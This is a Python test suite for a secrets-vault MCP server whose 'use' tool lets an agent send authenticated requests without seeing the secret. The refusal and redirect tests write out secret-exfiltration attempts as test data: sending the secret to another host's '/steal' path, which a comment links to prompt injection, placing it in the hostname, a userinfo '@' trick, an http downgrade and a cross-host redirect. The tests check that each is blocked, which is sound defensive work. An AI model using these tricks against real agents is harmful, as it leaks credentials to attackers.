"""mcp/server.py through the real MCP protocol (0.41.6): the official `mcp` client (1.28.0 — the version our own agents
run) starts the server over stdio against a live vault, the way Claude does. Covers what existed (health, list_secrets,
get, put — unchanged) and `use`: the agent makes a request WITH a secret and never sees it. Every target is a local
echo server that records what reached it, so "the secret was not sent" is checked where it would have arrived."""
import base64
import datetime
import ipaddress
import json
import os
import socket
import ssl
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
import uvicorn

import main
from conftest import unlock

HERE = os.path.dirname(os.path.abspath(__file__))
VENV = "/tmp/aps-vault-mcp-venv"
SECRET, LOGIN = "tok-Zq8!x/y+z=1\"q", "robot@example.com"      # a quote: JSON echoes it escaped


@pytest.fixture(scope="module")
def mcp_python():
    py = os.path.join(VENV, "bin", "python")
    if not os.path.exists(py):
        subprocess.run([sys.executable, "-m", "venv", VENV], check=True)
        subprocess.run([py, "-m", "pip", "install", "-q", "--disable-pip-version-check", "mcp[cli]==1.28.0", "httpx==0.28.1"],
                       check=True)
    return py


def _free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p


@pytest.fixture(scope="module")
def live_url(initialized):
    port = _free_port()
    server = uvicorn.Server(uvicorn.Config(main.app, host="127.0.0.1", port=port, log_level="warning", http="h11"))
    threading.Thread(target=server.run, daemon=True).start()
    deadline = time.time() + 10
    while not server.started and time.time() < deadline:
        time.sleep(0.05)
    assert server.started
    yield f"http://127.0.0.1:{port}"
    server.should_exit = True


class Echo:
    """An HTTP(S) server that records every request and echoes it back (headers and body) — the worst case for a
    secret: a target that repeats what it got. `redirect_to` makes it answer 302 instead."""
    def __init__(self, tls_files=None):
        self.seen, self.redirect_to = [], None
        echo = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _any(self):
                body = self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode()
                rec = {"method": self.command, "path": self.path, "headers": dict(self.headers), "body": body}
                echo.seen.append(rec)
                if echo.redirect_to:
                    self.send_response(302); self.send_header("Location", echo.redirect_to); self.end_headers(); return
                out = json.dumps(rec).encode()
                self.send_response(200); self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(out))); self.end_headers(); self.wfile.write(out)
            do_GET = do_POST = do_PUT = do_DELETE = _any

        self.port = _free_port()
        self.httpd = ThreadingHTTPServer(("127.0.0.1", self.port), H)
        if tls_files:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(*tls_files)
            self.httpd.socket = ctx.wrap_socket(self.httpd.socket, server_side=True)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def raw(self):
        return json.dumps(self.seen)


@pytest.fixture(scope="module")
def tls(tmp_path_factory):
    """A self-signed certificate for `localhost`; the MCP server trusts it through SSL_CERT_FILE (httpx honours it)."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
    d = tmp_path_factory.mktemp("tls")
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "localhost")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost"), x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]), False)
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
            .sign(key, hashes.SHA256()))
    (d / "cert.pem").write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    (d / "key.pem").write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    return str(d / "cert.pem"), str(d / "key.pem")


@pytest.fixture(scope="module")
def setup(client, initialized, tls):
    """Two targets: `api` over HTTPS is the host written in the secret's url; `other` is any other server."""
    api, other = Echo(tls), Echo(tls)
    hdr = unlock(client)
    fid = client.post("/api/folders", json={"name": "mcp-agent"}, headers=hdr).json()["id"]
    for body in ({"name": "api-key", "value": SECRET, "login": LOGIN, "url": f"https://localhost:{api.port}/"},
                 {"name": "no-url", "value": "plain-Kx92-value"}):
        assert client.post("/api/secrets", json={"folder_id": fid, **body}, headers=hdr).status_code == 200
    token = client.post("/api/tokens", json={"name": "mcp-agent", "folder_id": fid}, headers=hdr).json()["raw_token"]
    return {"token": token, "api": api, "other": other, "hdr": hdr}


def assert_no_trace(text, *more):
    """No 8 consecutive characters of the value — raw, percent-encoded, base64, JSON-escaped — anywhere in what the
    agent got. Exact-form checks missed real leaks here (a value echoed back partly percent-encoded, or escaped twice)."""
    from urllib.parse import quote, quote_plus
    for form in (SECRET, quote(SECRET, safe=""), quote_plus(SECRET), base64.b64encode(SECRET.encode()).decode(),
                 json.dumps(SECRET)[1:-1], *more):
        for i in range(len(form) - 7):
            assert form[i:i + 8] not in text, f"{form[i:i + 8]!r} of {form!r} leaked into: {text[:400]}"


def run(mcp_python, live_url, setup, tls, calls, **env):
    e = {k: v for k, v in os.environ.items() if not k.startswith(("APS_MCP_", "VAULT_"))}
    e.update(VAULT_URL=live_url, VAULT_TOKEN=setup["token"], SSL_CERT_FILE=tls[0], **env)
    r = subprocess.run([mcp_python, os.path.join(HERE, "mcp_driver.py"), json.dumps(calls)], env=e,
                       capture_output=True, text=True, timeout=120)
    assert r.returncode == 0, r.stderr[-2000:]
    return json.loads(r.stdout.strip().splitlines()[-1])


def test_existing_tools_are_unchanged(mcp_python, live_url, setup, tls):
    out = run(mcp_python, live_url, setup, tls, [["health", {}], ["list_secrets", {}], ["get", {"name": "api-key"}],
                                                 ["put", {"name": "x", "value": "y"}]])
    assert {"health", "list_secrets", "get", "put", "use"} <= set(out[0]["tools"])
    assert out[1]["data"]["status"] == "ok" and out[1]["data"]["token_name"] == "mcp-agent"
    assert {s["name"] for s in out[2]["data"]} == {"api-key", "no-url"}
    got = out[3]["data"]
    assert not out[3]["error"] and got["value"] == SECRET and got["login"] == LOGIN and got["name"] == "api-key"
    assert out[4]["error"] and "APS_MCP_ALLOW_WRITE" in str(out[4]["data"])        # 0.37 default kept


def test_use_sends_the_secret_to_its_own_host_and_never_returns_it(mcp_python, live_url, setup, tls):
    api = setup["api"]; api.seen.clear(); api.redirect_to = None
    basic = base64.b64encode(f"{LOGIN}:{SECRET}".encode()).decode()
    out = run(mcp_python, live_url, setup, tls, [
        ["use", {"name": "api-key", "url": f"https://localhost:{api.port}/v1/me?key={{{{secret}}}}",
                 "headers": {"Authorization": "Bearer {{secret}}", "X-Basic": "Basic {{basic}}"},
                 "method": "POST", "body": '{"user":"{{login}}","pass":"{{secret}}"}'}]])
    res = out[1]
    assert not res["error"], res
    d = res["data"]
    # the target got the real value in every place it was asked for …
    seen = api.seen[-1]
    assert seen["headers"]["Authorization"] == f"Bearer {SECRET}" and seen["headers"]["X-Basic"] == f"Basic {basic}"
    assert json.loads(seen["body"]) == {"user": LOGIN, "pass": SECRET} and "key=" in seen["path"]
    # … and the agent got the echo of all that with no form of the value left in it
    assert d["status"] == 200 and d["host"] == "localhost" and d["redacted"] >= 4
    assert_no_trace(json.dumps(d), basic)
    assert "[REDACTED]" in d["body"] and LOGIN in d["body"]       # the login is not a secret and stays readable


def test_use_refuses_to_send_the_secret_elsewhere(mcp_python, live_url, setup, tls):
    api, other = setup["api"], setup["other"]
    api.seen.clear(); other.seen.clear(); api.redirect_to = None
    calls = [
        # another host: the classic exfiltration a prompt injection would try
        ["use", {"name": "api-key", "url": f"https://127.0.0.1:{other.port}/steal", "headers": {"X": "{{secret}}"}}],
        # the placeholder in the host part, to make the secret pick the destination
        ["use", {"name": "api-key", "url": "https://{{secret}}.example.com/", "headers": {"X": "1"}}],
        # userinfo trick: the real host is the one after @
        ["use", {"name": "api-key", "url": f"https://localhost:{api.port}@127.0.0.1:{other.port}/", "headers": {"X": "{{secret}}"}}],
        # plain http to the secret's own host is not https
        ["use", {"name": "api-key", "url": f"http://localhost:{api.port}/", "headers": {"X": "{{secret}}"}}],
        # a secret without url is bound to nothing
        ["use", {"name": "no-url", "url": f"https://localhost:{api.port}/", "headers": {"X": "{{secret}}"}}],
        # no placeholder at all
        ["use", {"name": "api-key", "url": f"https://localhost:{api.port}/"}],
        # a secret outside the token's folder
        ["use", {"name": "nope", "url": f"https://localhost:{api.port}/", "headers": {"X": "{{secret}}"}}],
    ]
    out = run(mcp_python, live_url, setup, tls, calls)
    assert all(r["error"] for r in out[1:]), out
    assert "127.0.0.1" in str(out[1]["data"]) and "localhost" in str(out[1]["data"])     # says why and where it is bound
    assert not other.seen, other.seen                                                    # nothing reached the other host
    assert SECRET not in api.raw() and "plain-Kx92-value" not in api.raw()
    for r in out[1:]:
        assert_no_trace(json.dumps(r)); assert "plain-Kx92-value" not in json.dumps(r)


def test_use_does_not_follow_redirects(mcp_python, live_url, setup, tls):
    api, other = setup["api"], setup["other"]
    other.seen.clear(); api.redirect_to = f"https://127.0.0.1:{other.port}/landing"
    try:
        out = run(mcp_python, live_url, setup, tls, [
            ["use", {"name": "api-key", "url": f"https://localhost:{api.port}/r", "headers": {"Authorization": "Bearer {{secret}}"}}]])
    finally:
        api.redirect_to = None
    d = out[1]["data"]
    assert not out[1]["error"] and d["status"] == 302 and d["headers"]["location"].endswith("/landing")
    assert not other.seen                                                                # the redirect was not followed


def test_operator_hosts_and_get_off(mcp_python, live_url, setup, tls, client):
    other = setup["other"]; other.seen.clear()
    out = run(mcp_python, live_url, setup, tls, [
        ["use", {"name": "no-url", "url": f"https://127.0.0.1:{other.port}/ok", "headers": {"X-Key": "{{secret}}"}}],
        ["get", {"name": "api-key"}],
    ], APS_MCP_USE_HOSTS="127.0.0.1", APS_MCP_DISABLE_GET="1")
    assert not out[1]["error"] and out[1]["data"]["status"] == 200, out[1]
    assert other.seen[-1]["headers"]["X-Key"] == "plain-Kx92-value"                      # the operator's host gets it
    assert "plain-Kx92-value" not in json.dumps(out[1])
    assert out[2]["error"] and "APS_MCP_DISABLE_GET" in str(out[2]["data"]) and SECRET not in json.dumps(out[2])
    # the vault's own audit says the read was a `use`, and towards which host
    audit = client.get("/api/audit?limit=200", headers=setup["hdr"]).json()
    uas = [a["user_agent"] for a in audit if a["action"] == "m:secret:read"]
    assert "aps-vault-mcp/use host=127.0.0.1" in uas and "aps-vault-mcp/use host=localhost" in uas
